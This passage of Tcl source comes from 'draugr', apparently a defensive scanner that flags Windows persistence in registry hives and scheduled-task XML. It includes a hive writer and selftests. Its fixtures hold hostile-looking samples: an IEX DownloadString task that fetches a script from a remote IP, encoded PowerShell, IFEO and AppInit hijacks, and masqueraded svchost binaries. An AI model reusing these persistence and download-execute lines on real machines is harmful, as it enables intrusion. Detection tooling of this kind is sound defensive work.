                if {$known} {
                    dg_benign
                } else {
                    set sev med
                    if {[dg_path_zone $txt] eq "user"} { set sev high }
                    dg_finding A15 $sev $wh "print monitor driver" $txt
                }
            }
        }
        return
    }

    # --- safeboot alternate shell
    if {$tail eq "alternateshell"} {
        set hit [dg_ev "" $values "(default)"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            set norm [string trim [string tolower $txt]]
            if {$norm ne "" && $norm ne "cmd.exe"} {
                dg_finding A16 med "hive value $full \\ (default)" "safeboot shell replaced" $txt
            }
        }
        return
    }
}
# ---------------------------------------------------------------- task xml

# scheduled task files: extract actions, principals, triggers without a real
# xml parser — the Task schema is small and stable enough for a targeted scan.

proc tk_text_normalize {raw} {
    set raw [string map [list \r\n \n \r \n] $raw]
    return $raw
}

# pull inner text of <tag>...</tag> inside a block
proc tk_inner {block tag} {
    set rx "<${tag}>(.*?)</${tag}>"
    if {[regexp -nocase $rx $block -> txt]} {
        return [string trim $txt]
    }
    return ""
}

# returns a task dict: {name uri actions principals triggers desc}
proc tk_parse {raw fname} {
    set raw [tk_text_normalize $raw]
    if {![regexp -nocase {<task\y|<actions\y} $raw]} {
        return -code error "not a task xml"
    }
    set uri [tk_inner $raw "URI"]
    set desc [tk_inner $raw "Description"]
    set author [tk_inner $raw "Author"]
    set hidden 0
    set highest 0
    set logontype ""
    set user ""
    if {[regexp -nocase {<principal>(.*?)</principal>} $raw -> pr]} {
        set h [tk_inner $pr "Hidden"]
        if {[string tolower $h] eq "true"} { set hidden 1 }
        set rl [tk_inner $pr "RunLevel"]
        if {[string tolower $rl] eq "highest"} { set highest 1 }
        set logontype [tk_inner $pr "LogonType"]
        set user [tk_inner $pr "UserId"]
        if {$user eq ""} { set user [tk_inner $pr "GroupId"] }
    }
    set execs {}
    foreach {- blk} [regexp -all -nocase -inline {<exec>(.*?)</exec>} $raw] {
        lappend execs $blk
    }
    foreach {- blk} [regexp -all -nocase -inline {<comhandler>(.*?)</comhandler>} $raw] {
        lappend execs $blk
    }
    set actions {}
    set i 0
    foreach blk $execs {
        set cmd [tk_inner $blk "Command"]
        set args [tk_inner $blk "Arguments"]
        set clsid [tk_inner $blk "ClassId"]
        if {$cmd eq "" && $clsid eq ""} { continue }
        lappend actions [list $i $cmd $args $clsid]
        incr i
    }
    set triggers {}
    foreach t {BootTrigger LogonTrigger TimeTrigger DailyTrigger WeeklyTrigger
        CalendarTrigger SessionStateChangeTrigger RegistrationTrigger IdleTrigger} {
        if {[regexp -nocase "<${t}\\y" $raw]} { lappend triggers $t }
    }
    return [list $fname $uri $actions [list $hidden $highest $logontype $user] $triggers $desc]
}

# ---------------------------------------------------------------- task rules

proc dg_rules_task {t} {
    lassign $t fname uri actions princ triggers desc
    lassign $princ hidden highest logontype user
    set base "task: $fname"
    if {$uri ne ""} { append base " ($uri)" }
    set is_guid 0
    set namefor [expr {$uri ne "" ? $uri : $fname}]
    if {[regexp -nocase {[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}} $namefor]
        || [regexp {^[^\\]*\{[0-9a-f-]{36}\}} [string tolower $namefor]]} {
        set is_guid 1
    }
    set logonish 0
    foreach tr $triggers {
        if {$tr eq "LogonTrigger" || $tr eq "BootTrigger" || $tr eq "SessionStateChangeTrigger"} {
            set logonish 1
        }
    }
    set any_act 0
    foreach act $actions {
        lassign $act i cmd args clsid
        incr any_act
        set wh "task $fname action#$i"
        if {$clsid ne ""} {
            dg_benign
            continue
        }
        set whole [string trim "$cmd $args"]
        if {[dg_invisible_name $fname] || [dg_invisible_name $uri]} {
            dg_finding S06 med $wh "invisible unicode in task identity" $namefor
        }
        set masq [dg_masquerade $whole]
        if {$masq ne ""} {
            dg_finding S08 crit $wh "system binary name outside system32: $masq" $whole
            continue
        }
        set v [dg_verbs $whole]
        if {[llength $v] == 2} {
            lassign $v sev rx
            dg_finding S02 $sev $wh "suspicious command shape" $whole
        }
        set zone [dg_path_zone $cmd]
        if {$zone eq "user"} {
            dg_finding S01 high $wh "command in user-writable path" $whole
        } elseif {$zone eq "gray"} {
            dg_finding S01 med $wh "command in programdata" $whole
        }
        if {$is_guid && [dg_scripty $whole]} {
            dg_finding S06 high $wh "machine-named task running a script" $whole
        }
        if {[regexp -nocase {schtasks[^|]*/create} $whole]} {
            dg_finding S07 high $wh "task creates another task" $whole
        }
        if {$logonish && ([llength $v] == 2 || $zone eq "user")} {
            dg_finding S05 high $wh "logon/boot trigger with risky payload" $whole
        }
        set trusted_ns [string match {\\microsoft\\windows*} [string tolower $namefor]]
        if {[llength $v] == 0 && $zone eq "sys" && !$is_guid} {
            dg_benign
        } elseif {[llength $v] == 0 && $zone eq "" && $trusted_ns} {
            dg_benign
        } elseif {[llength $v] == 0 && $zone eq ""} {
            dg_finding S01 low $wh "unusual command path" $whole
        }
    }
    if {$any_act == 0} {
        dg_finding S09 low $base "task has no executable action (comhandler-only or empty)" $uri
    }
    if {$hidden && $highest} {
        dg_finding S03 high $base "hidden task running at highest privileges" $user
    } elseif {$hidden} {
        dg_finding S03 med $base "hidden task" $user
    } elseif {$highest && [string length $base] > 0} {
        # highest alone is common; only note when paired with a scripty action
        foreach act $actions {
            lassign $act i cmd args clsid
            if {[dg_scripty "$cmd $args"] && [dg_path_zone $cmd] ne "sys"} {
                dg_finding S04 med $base "highest runlevel for a script task" $cmd
                break
            }
        }
    }
    if {$logonish && $hidden} {
        dg_finding S05 med $base "hidden autostart at logon or boot" [lindex $triggers 0]
    }
}
# ---------------------------------------------------------------- hive forge

# deterministic regf writer: builds real hive bytes so the scanner can be
# exercised offline, and so the reader proves it reads what it claims.

set ::HB ""
set ::SPEC {}

proc hb_alloc {payload} {
    set n [expr {[string length $payload] + 4}]
    set cell [expr {($n + 7) / 8 * 8}]
    set pad [expr {$cell - $n}]
    set off [string length $::HB]
    append ::HB [binary format i $cell] $payload [string repeat "\x00" $pad]
    return $off
}

proc dg_sz {s} {
    return "[encoding convertto unicode $s]\x00\x00"
}

proc dg_msz {args} {
    set out ""
    foreach s $args {
        append out "[encoding convertto unicode $s]\x00\x00"
    }
    append out "\x00\x00"
    return $out
}

# name encoder: pure ascii names go as bytes (flag 0x0002/0x0020), anything
# else goes as utf-16le so the parser round-trips invisible unicode
proc hb_name {name ascii_flag} {
    if {[regexp {^[\x00-\x7F]*$} $name]} {
        return [list [string length $name] $ascii_flag $name]
    }
    set raw [encoding convertto unicode $name]
    return [list [string length $raw] 0 $raw]
}

proc hb_vk {name type data} {
    lassign [hb_name $name 0x0002] nl nflags nraw
    set dl [string length $data]
    if {$dl <= 4} {
        set inline "${data}\x00\x00\x00\x00"
        set inline [string range $inline 0 3]
        set p "vk"
        append p [binary format s $nl]
        append p [binary format iu [expr {0x80000000 | $dl}]]
        append p $inline
        append p [binary format iu $type]
        append p [binary format ss $nflags 0]
        append p $nraw
    } else {
        set coff [hb_alloc $data]
        set p "vk"
        append p [binary format s $nl]
        append p [binary format iu $dl]
        append p [binary format iu $coff]
        append p [binary format iu $type]
        append p [binary format ss $nflags 0]
        append p $nraw
    }
    return [hb_alloc $p]
}

proc hb_node {children path name rootname} {
    set suboffs {}
    set subnames {}
    if {$path eq ""} {
        set shown $rootname
    } else {
        set shown $name
    }
    if {[dict exists $children $path]} {
        foreach ent [dict get $children $path] {
            lassign $ent cname cpath
            lappend suboffs [hb_node $children $cpath $cname $rootname]
            lappend subnames $cname
        }
    }
    set vals {}
    if {[dict exists $::SPEC $path]} { set vals [dict get $::SPEC $path] }
    set voffs {}
    foreach v $vals {
        lassign $v vn vt vd
        lappend voffs [hb_vk $vn $vt $vd]
    }
    set subl 0xFFFFFFFF
    if {[llength $suboffs] > 0} {
        set pl "lf"
        append pl [binary format s [llength $suboffs]]
        foreach o $suboffs nm $subnames {
            append pl [binary format iu $o]
            set hint "${nm}\x00\x00\x00\x00"
            append pl [string range $hint 0 3]
        }
        set subl [hb_alloc $pl]
    }
    set vlistoff 0xFFFFFFFF
    if {[llength $voffs] > 0} {
        set pl [binary format iu [llength $voffs]]
        foreach o $voffs { append pl [binary format iu $o] }
        set vlistoff [hb_alloc $pl]
    }
    lassign [hb_name $shown 0x0020] nlen nflags nraw
    set p "nk"
    append p [binary format s $nflags]
    append p [binary format w 0]
    append p [binary format iu 0]
    append p [binary format iu 0]
    append p [binary format iu [llength $suboffs]]
    append p [binary format iu 0]
    append p [binary format iu $subl]
    append p [binary format iu 0xFFFFFFFF]
    append p [binary format iu [llength $voffs]]
    append p [binary format iu $vlistoff]
    append p [binary format iu 0]
    append p [binary format iu 0]
    append p [binary format iu 0]
    append p [binary format iu 0]
    append p [binary format iu 0]
    append p [binary format iu 0]
    append p [binary format iu 0]
    append p [binary format ss $nlen 0]
    append p $nraw
    return [hb_alloc $p]
}

proc hb_hive {spec {rootname "PROTOHIVE"}} {
    set children [dict create]
    set seen [dict create]
    dict for {p vals} $spec {
        set comps [split $p "\\"]
        set n [llength $comps]
        for {set i 0} {$i < $n} {incr i} {
            set parent [join [lrange $comps 0 [expr {$i - 1}]] "\\"]
            set cur [join [lrange $comps 0 $i] "\\"]
            set key "${parent}|${cur}"
            if {![dict exists $seen $key]} {
                dict set seen $key 1
                dict lappend children $parent [list [lindex $comps $i] $cur]
            }
        }
    }
    set ::SPEC $spec
    # the first hbin header lives at 0x1000; cells start 32 bytes later, so
    # reserve that space up front to keep cell offsets honest
    set ::HB "[string repeat "\x00" 32]"
    set rootoff [hb_node $children "" "" $rootname]
    set hblen [string length $::HB]
    set hbinsize [expr {((($hblen) / 0x1000) + 1) * 0x1000}]
    set hdr "regf"
    append hdr [binary format iu 1]
    append hdr [binary format iu 1]
    append hdr [binary format w 0]
    append hdr [binary format iu 1]
    append hdr [binary format iu 5]
    append hdr [binary format iu 0]
    append hdr [binary format iu 1]
    append hdr [binary format iu $rootoff]
    append hdr [binary format iu $hbinsize]
    append hdr [binary format iu 1]
    set hdr "$hdr[string repeat "\x00" [expr {0x1FC - [string length $hdr]}]]"
    binary scan $hdr iu* words
    set sum 0
    foreach w $words { set sum [expr {$sum ^ $w}] }
    set file "$hdr[binary format iu $sum]"
    append file [string repeat "\x00" [expr {0x1000 - [string length $file]}]]
    # the reserved first 32 bytes of ::HB are the hbin header itself
    set hbin "hbin"
    append hbin [binary format iu 0]
    append hbin [binary format iu $hbinsize]
    append hbin [string repeat "\x00" 20]
    set ::HB "$hbin[string range $::HB 32 end]"
    append file $::HB
    append file [string repeat "\x00" [expr {$hbinsize - [string length $::HB]}]]
    return $file
}

# ---------------------------------------------------------------- fixtures

proc dg_fixture_clean {} {
    set spec [dict create]
    dict set spec "Microsoft\\Windows\\CurrentVersion\\Run" [list \
        [list OneDrive 1 [dg_sz {C:\Users\user\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background}]] \
        [list SecurityHealth 1 [dg_sz {C:\Windows\system32\SecurityHealthSystray.exe}]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Winlogon" [list \
        [list Shell 1 [dg_sz {explorer.exe}]] \
        [list Userinit 1 [dg_sz {C:\Windows\system32\userinit.exe,}]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\GPNotify" [list \
        [list DllName 1 [dg_sz {C:\Windows\system32\gpapi.dll}]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Windows" [list \
        [list AppInit_DLLs 1 [dg_sz {}]] \
        [list LoadAppInit_DLLs 4 [binary format i 0]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Lsa" [list \
        [list {Authentication Packages} 7 [dg_msz msv1_0]] \
        [list {Security Packages} 7 [dg_msz schannel kerberos wdigest]]]
    dict set spec "Control\\Session Manager" [list \
        [list BootExecute 7 [dg_msz {autocheck autochk *}]]]
    dict set spec "Control\\Print\\Monitors\\Local Spl" [list \
        [list Driver 1 [dg_sz {localspl.dll}]]]
    dict set spec "ControlSet001\\Services\\SetSvc" [list \
        [list ImagePath 1 [dg_sz {C:\Windows\system32\svchost.exe -k netsvcs}]] \
        [list Start 4 [binary format i 2]]]
    dict set spec "ControlSet001\\Services\\SetSvc\\Parameters" [list \
        [list ServiceDll 1 [dg_sz {C:\Windows\system32\setsvc.dll}]]]
    dict set spec "Microsoft\\Active Setup\\Installed Components\\{89820200-ECBD-11cf-8B85-00AA005B4383}" [list \
        [list StubPath 1 [dg_sz {regsvr32.exe /s /n /u /i /z "%11%\ieframe.dll"}]]]
    return [hb_hive $spec "CLEANHIVE"]
}

proc dg_fixture_dirty {} {
    set spec [dict create]
    dict set spec "Microsoft\\Windows\\CurrentVersion\\Run" [list \
        [list "WindowsHealthCheck" 1 [dg_sz {powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA}]] \
        [list "Windows upd\u200bexact" 1 [dg_sz {%TEMP%\upd\run32.dll,svchost.exe}]] \
        [list "Updater" 1 [dg_sz {%TEMP%\upd\svchost.exe /quiet}]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Winlogon" [list \
        [list Userinit 1 [dg_sz {C:\Windows\system32\userinit.exe,C:\Users\pub\upd.dll}]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\GPNotify" [list \
        [list DllName 1 [dg_sz {C:\Windows\Temp\gpn.dll}]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Windows" [list \
        [list AppInit_DLLs 1 [dg_sz {C:\Users\pub\hook.dll}]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Lsa" [list \
        [list {Notification Packages} 7 [dg_msz secpath]]]
    dict set spec "Control\\Session Manager" [list \
        [list BootExecute 7 [dg_msz {autocheck autochk *} {C:\Windows\Temp\native.exe}]]]
    dict set spec "Control\\Print\\Monitors\\EvilMon" [list \
        [list Driver 1 [dg_sz {C:\Users\pub\mon.dll}]]]
    dict set spec "Microsoft\\Image File Execution Options\\msmpeng.exe" [list \
        [list Debugger 1 [dg_sz {C:\Users\pub\taskmgr.exe}]]]
    dict set spec "Software\\Microsoft\\Command Processor" [list \
        [list AutoRun 1 [dg_sz {powershell.exe -nop -ep bypass C:\Users\pub\s.ps1}]]]
    dict set spec "ControlSet001\\Services\\WinDefendCheck" [list \
        [list ImagePath 1 [dg_sz {C:\ProgramData\svc\svhost.exe -k netsvcs}]]]
    dict set spec "Control\\SafeBoot\\AlternateShell" [list \
        [list (default) 1 [dg_sz {pwsh.exe}]]]
    dict set spec "Microsoft\\Windows\\CurrentVersion\\RunOnceEx" [list \
        [list 09 1 [dg_sz {||C:\Users\pub\run.dll}]]]
    dict set spec "Microsoft\\Windows NT\\CurrentVersion\\Winlogon" [list \
        [list Userinit 1 [dg_sz {C:\Windows\system32\userinit.exe,C:\Users\pub\upd.dll}]] \
        [list UserinitMprLogonScript 1 [dg_sz {C:\Users\pub\logon.bat}]]]
    return [hb_hive $spec "DIRTYHIVE"]
}

set DG_TASK_CLEAN {<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\Microsoft\Windows\Defrag\ScheduledDefrag</URI><Author>Microsoft Corporation</Author></RegistrationInfo>
  <Triggers><CalendarTrigger><StartBoundary>2026-01-01T03:00:00</StartBoundary></CalendarTrigger></Triggers>
  <Principal><UserId>S-1-5-18</UserId><RunLevel>LeastPrivilege</RunLevel></Principal>
  <Actions Context="Author"><Exec><Command>C:\Windows\system32\defrag.exe</Command><Arguments>/c</Arguments></Exec></Actions>
</Task>
}

set DG_TASK_ENC {<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\HealthChecks\Agent{8F2C4A1E-77D3-4A21-B1F4-9A2C5D6E3F10}</URI></RegistrationInfo>
  <Triggers><LogonTrigger/></Triggers>
  <Principal><UserId>S-1-5-18</UserId><RunLevel>Highest</RunLevel><Hidden>true</Hidden></Principal>
  <Actions><Exec><Command>%TEMP%\sv\svchost.exe</Command><Arguments>-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=</Arguments></Exec></Actions>
</Task>
}

set DG_TASK_IEX {<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\Microsoft\Windows\SysCheck</URI></RegistrationInfo>
  <Triggers><TimeTrigger><Repetition Interval="PT10M"/></TimeTrigger></Triggers>
  <Principal><UserId>S-1-5-18</UserId><RunLevel>Highest</RunLevel><Hidden>true</Hidden></Principal>
  <Actions><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://185.60.10.128/a.ps1')"</Arguments></Exec></Actions>
</Task>
}

set DG_TASK_GUID {<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\Updates\Agent{D3ADB33F-1111-4222-8333-445566778899}</URI></RegistrationInfo>
  <Triggers><LogonTrigger/></Triggers>
  <Principal><UserId>S-1-5-21-1004336348-1172679000-682003330-1001</UserId><LogonType>InteractiveToken</LogonType></Principal>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>//B "%APPDATA%\sysupd.vbs"</Arguments></Exec></Actions>
</Task>
}

set DG_TASK_REQUEUE {<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\OneDriveStandaloneUpdater</URI></RegistrationInfo>
  <Triggers><TimeTrigger><StartBoundary>2026-01-01T09:00:00</StartBoundary></TimeTrigger></Triggers>
  <Principal><UserId>S-1-5-18</UserId></Principal>
  <Actions><Exec><Command>cmd.exe</Command><Arguments>/c schtasks /create /tn "WindowsHealthCheck" /sc onlogon /tr "%TEMP%\upd\svchost.exe"</Arguments></Exec></Actions>
</Task>
}

proc dg_forge {dir} {
    global DG_TASK_CLEAN DG_TASK_ENC DG_TASK_IEX DG_TASK_GUID DG_TASK_REQUEUE
    file mkdir $dir $dir/tasks/clean $dir/tasks/dirty
    set fh [open [file join $dir clean_system.hiv] w]
    fconfigure $fh -translation binary
    puts -nonewline $fh [dg_fixture_clean]
    close $fh
    set fh [open [file join $dir dirty_system.hiv] w]
    fconfigure $fh -translation binary
    puts -nonewline $fh [dg_fixture_dirty]
    close $fh
    set i 0
    foreach {name data} [list \
        task_defrag.xml $DG_TASK_CLEAN \
        task_guid_enc.xml $DG_TASK_ENC \
        task_webcmd.xml $DG_TASK_IEX \
        task_script_guid.xml $DG_TASK_GUID \
        task_requeue.xml $DG_TASK_REQUEUE] {
        set bucket clean
        if {$i > 0} { set bucket dirty }
        set fh [open [file join $dir tasks $bucket $name] w]
        fconfigure $fh -translation binary
        puts -nonewline $fh $data
        close $fh
        incr i
    }
    set fh [open [file join $dir README.txt] w]
    puts $fh "forged evidence set for draugr. synthetic, deterministic, inert."
    puts $fh "scan it: draugr scan clean_system.hiv dirty_system.hiv tasks/clean tasks/dirty"
    close $fh
    return [list [file join $dir clean_system.hiv] [file join $dir dirty_system.hiv] \
        [file join $dir tasks clean] [file join $dir tasks dirty]]
}
# ---------------------------------------------------------------- rules table

proc dg_rules_table {} {
    return {
        {A01 {run / runonce entries}}
        {A02 {runonceex entries}}
        {A03 {cmd.exe AutoRun}}
        {A04 {winlogon Shell replaced}}
        {A05 {winlogon Userinit tampering}}
        {A06 {winlogon Taskman set}}
        {A07 {winlogon Notify packages}}
        {A08 {AppInit_DLLs / loader}}
        {A09 {IFEO Debugger hijack}}
        {A10 {LSA package tampering}}
        {A11 {BootExecute changed}}
        {A12 {service ImagePath}}
        {A13 {service ServiceDll}}
        {A14 {Active Setup StubPath}}
        {A15 {print monitor drivers}}
        {A16 {safeboot AlternateShell}}
        {A17 {invisible unicode in autostart names}}
        {A18 {logon script in winlogon}}
        {S01 {task command location}}
        {S02 {task suspicious command shape}}
        {S03 {hidden / privileged task}}
        {S04 {highest runlevel for scripts}}
        {S05 {logon or boot trigger with risky payload}}
        {S06 {machine-named task with script}}
        {S07 {task creating tasks}}
        {S08 {masquerading binary in task}}
        {S09 {empty action task}}
    }
}

# ---------------------------------------------------------------- score/report

proc dg_score {} {
    set score 0
    foreach f $::DG_FINDINGS {
        set r [dg_sev_rank [lindex $f 1]]
        if {$r > $score} { set score $r }
    }
    return $score
}

proc dg_counts {} {
    set c [dict create low 0 med 0 high 0 crit 0]
    foreach f $::DG_FINDINGS {
        dict incr c [lindex $f 1]
    }
    return $c
}

proc dg_verdict_now {} {
    return [dg_band [dg_score]]
}

proc dg_minv_rank {} {
    switch -- $::OPT(minv) {
        low { return 1 }
        med { return 2 }
        high { return 3 }
        crit { return 4 }
    }
    return 1
}

proc dg_report_text {inputs} {
    if {!$::OPT(quiet)} { puts -nonewline [dg_banner] }
    foreach inp $inputs {
        lassign $inp path kind note
        if {$::OPT(quiet)} { continue }
        puts "  [dg_dim "scanned"] [dg_cyan $kind] [dg_dim "$path"]"
        if {$note ne ""} { puts "  [dg_dim "$note"]" }
    }
    set sevs {}
    foreach f $::DG_FINDINGS { lappend sevs [lindex $f 1] }
    set order {crit high med low}
    set shown 0
    foreach sev $order {
        foreach f $::DG_FINDINGS {
            lassign $f id fsev where why evidence
            if {$fsev ne $sev} { continue }
            if {[dg_sev_rank $fsev] < [dg_minv_rank]} { continue }
            incr shown
            switch -- $sev {
                crit { set tag [dg_red "crit"] }
                high { set tag [dg_red "high"] }
                med { set tag [dg_amber "med "] }
                low { set tag [dg_dim "low "] }
            }
            puts "  $tag [dg_bold "$id"] [dg_dim "-"] $why"
            puts "       [dg_dim "$where"]"
            if {$evidence ne ""} {
                puts "       [dg_dim "evidence:"] $evidence"
            }
        }
    }
    if {$shown == 0 && !$::OPT(quiet)} {
        puts "  [dg_dim "no findings above the threshold"]"
    }
    set c [dg_counts]
    set v [dg_verdict_now]
    if {!$::OPT(quiet)} {
        puts "  [dg_dim "silent autostarts (benign):"] $::DG_BENIGN"
    }
    puts "  [dg_bold verdict:] [dg_band_color $v] [dg_dim "(crit [dict get $c crit], high [dict get $c high], med [dict get $c med], low [dict get $c low])"]"
}

proc dg_report_json {inputs} {
    set c [dg_counts]
    set out {}
    lappend out "\"tool\": \"draugr\""
    lappend out "\"version\": \"$::DG_VERSION\""
    lappend out "\"verdict\": \"[dg_verdict_now]\""
    lappend out "\"score\": [dg_score]"
    lappend out "\"benign\": $::DG_BENIGN"
    lappend out "\"counts\": \{\"low\": [dict get $c low], \"med\": [dict get $c med], \"high\": [dict get $c high], \"crit\": [dict get $c crit]\}"
    set fl {}
    foreach f $::DG_FINDINGS {
        lassign $f id sev where why evidence
        if {[dg_sev_rank $sev] < [dg_minv_rank]} { continue }
        lappend fl "\{\"id\": \"[dg_json_escape $id]\", \"severity\": \"$sev\", \"where\": \"[dg_json_escape $where]\", \"why\": \"[dg_json_escape $why]\", \"evidence\": \"[dg_json_escape $evidence]\"\}"
    }
    lappend out "\"findings\": \[[join $fl ",\n"]\]"
    set il {}
    foreach inp $inputs {
        lassign $inp path kind note
        lappend il "\{\"path\": \"[dg_json_escape $path]\", \"kind\": \"$kind\"\}"
    }
    lappend out "\"inputs\": \[[join $il ", "]\]"
    return "\{[join $out ",\n"]\}"
}

# ---------------------------------------------------------------- scan / keys / dump

proc dg_sniff {data} {
    if {[string length $data] < 8} { return unknown }
    if {[string range $data 0 3] eq "regf"} { return hive }
    # binary data may not be valid utf-8; a failed probe just means not-a-task
    if {[catch {regexp -nocase {<task\y|<actions\y} $data} m]} { return unknown }
    if {$m} { return task }
    return unknown
}

proc dg_cb_hive {path vals} {
    dg_rules_hive $path $vals
    lappend ::DG_PATHS $path
}

proc dg_scan_one {path inputsVar} {
    upvar $inputsVar inputs
    if {[file isdirectory $path]} {
        set count 0
        foreach f [lsort [glob -nocomplain -directory $path -types f *.xml]] {
            dg_scan_one $f inputs
            incr count
        }
        foreach sub [lsort [glob -nocomplain -directory $path -types d *]] {
            dg_scan_one $sub inputs
        }
        if {$count == 0 && [llength [glob -nocomplain -directory $path -types f *]] == 0} {
            lappend inputs [list $path "empty" "no artifacts inside"]
        }
        return
    }
    if {![file isfile $path]} {
        dg_finding PAR med "input $path" "input missing" "not a file or directory"
        lappend inputs [list $path "missing" ""]
        return
    }
    if {[catch {
        set fh [open $path rb]
        fconfigure $fh -translation binary
        set data [read $fh]
        close $fh
    } err]} {
        dg_finding PAR med "input $path" "unreadable input" $err
        lappend inputs [list $path "unreadable" ""]
        return
    }
    set kind [dg_sniff $data]
    switch -- $kind {
        hive {
            lappend inputs [list $path "hive" ""]
            set ::DG_PATHS {}
            if {[catch {rg_walk $data dg_cb_hive} err]} {
                dg_finding PAR med "input $path" "malformed hive: $err" "the structure fights back; parsing stopped early"
            }
        }
        task {
            lappend inputs [list $path "task" ""]
            if {[catch {
                set t [tk_parse $data $path]
                dg_rules_task $t
            } err]} {
                dg_finding PAR med "input $path" "malformed task xml" $err
            }
        }
        unknown {
            dg_finding PAR med "input $path" "unknown artifact type" "neither a regf hive nor task xml"
            lappend inputs [list $path "unknown" ""]
        }
    }
}

proc dg_cmd_scan {paths} {
    set inputs {}
    foreach p $paths { dg_scan_one $p inputs }
    if {[llength $inputs] == 0} {
        puts stderr "draugr: nothing to scan"
        return 2
    }
    if {$::OPT(json)} {
        puts [dg_report_json $inputs]
    } else {
        dg_report_text $inputs
    }
    return [dg_band_exit [dg_verdict_now]]
}

proc dg_cmd_keys {hivepath} {
    set fh [open $hivepath rb]
    fconfigure $fh -translation binary
    set data [read $fh]
    close $fh
    set ::DG_PATHS {}
    set nkeys 0
    if {[catch {
        set nkeys [rg_walk $data dg_walkcollect]
    } err]} {
        puts stderr "draugr: $err"
        return 2
    }
    foreach p [lsort $::DG_PATHS] {
        set depth [expr {[llength [split $p "\\"]] - 1}]
        set ind [string repeat "  " $depth]
        set base [lindex [split $p "\\"] end]
        puts "$ind$base"
    }
    puts [dg_dim "$nkeys keys"]
    return 0
}

proc dg_walkcollect {p v} {
    lappend ::DG_PATHS $p
}

proc dg_cb_dump {p v} {
    if {[string equal -nocase $p $::DUMP_TARGET]} {
        set ::DUMP_VALS $v
    }
}

proc dg_cmd_dump {hivepath keypath} {
    set fh [open $hivepath rb]
    fconfigure $fh -translation binary
    set data [read $fh]
    close $fh
    set ::DUMP_VALS {}
    if {[catch {
        rg_walk $data dg_cb_dump
    } err]} {
        puts stderr "draugr: $err"
        return 2
    }
    if {[llength $::DUMP_VALS] == 0} {
        puts stderr "draugr: key not found: $keypath"
        return 2
    }
    foreach v $::DUMP_VALS {
        lassign $v name type dlen raw
        set tn [rg_type_name $type]
        set human [rg_val_string $v]
        puts "[dg_cyan $name]  [dg_dim "$tn"]"
        if {$human ne ""} { puts "    $human" }
    }
    return 0
}

# ---------------------------------------------------------------- selftest

set ST_PASS 0
set ST_FAIL {}

proc st {label cond} {
    set ok 0
    catch { set ok [uplevel 1 [list expr $cond]] }
    if {[string is integer -strict $ok] || $ok eq "1" || $ok eq "true"} {
        if {$ok} {
            incr ::ST_PASS
            return
        }
    }
    lappend ::ST_FAIL $label
}

proc st_findings_ids {} {
    set ids {}
    foreach f $::DG_FINDINGS { lappend ids [lindex $f 0] }
    return $ids
}

proc st_cb_run {p v} {
    if {[string last "CurrentVersion\\Run" $p] >= 0} {
        set ::RUNVALS $v
    }
}

proc st_cb_lsa {p v} {
    if {[string last "CurrentVersion\\Lsa" $p] >= 0} {
        set ::LSAVALS $v
    }
}

proc dg_selftest {} {
    global DG_TASK_CLEAN DG_TASK_ENC DG_TASK_IEX DG_TASK_GUID DG_TASK_REQUEUE
    # 1-2: verdict bands and exits
    st "band clean" {[dg_band 0] eq "clean"}
    st "band hostile" {[dg_band 3] eq "hostile"}
    st "exits" {[dg_band_exit clean] == 0 && [dg_band_exit watch] == 1
        && [dg_band_exit suspicious] == 3 && [dg_band_exit hostile] == 10}

    # 3: decompressor (control 0x01: one literal, then a backref)
    set stream [binary format c4 {1 65 128 0}]
    st "depress literal+backref" {[rg_depress $stream 12] eq "AAAAAAAAAAAA"}

    # 4-7: classifiers
    st "masquerade in temp" {[dg_masquerade {%TEMP%\x\svchost.exe}] eq "svchost.exe"}
    st "masquerade in system32 is fine" {[dg_masquerade {C:\Windows\system32\svchost.exe -k netsvcs}] eq ""}
    st "onedrive whitelisted" {[dg_classify_cmd {C:\Users\u\AppData\Local\Microsoft\OneDrive\OneDrive.exe} "" run] eq ""}
    st "verb -enc is high" {[lindex [dg_classify_cmd {powershell.exe} {-enc AAAA} run] 0] eq "high"}
    st "invisible name" {[dg_invisible_name "run\u200bx"] == 1}
    st "visible name ok" {[dg_invisible_name "WindowsUpdate"] == 0}

    # 8-10: clean fixture stays clean
    set ::DG_FINDINGS {}
    set ::DG_BENIGN 0
    set clean [dg_fixture_clean]
    set ::DG_PATHS {}
    set nk [rg_walk $clean dg_cb_hive]
    st "clean hive parses" {$nk > 0}
    st "clean hive verdict clean" {[llength $::DG_FINDINGS] == 0}

    # 11-15: dirty fixture verdict and rule coverage
    set ::DG_FINDINGS {}
    set ::DG_BENIGN 0
    set dirty [dg_fixture_dirty]
    if {[catch {rg_walk $dirty dg_cb_hive} err]} {
        st "dirty hive parses" 0
    } else {
        st "dirty hive parses" 1
    }
    set ids [st_findings_ids]
    st "dirty verdict hostile" {[dg_verdict_now] eq "hostile"}
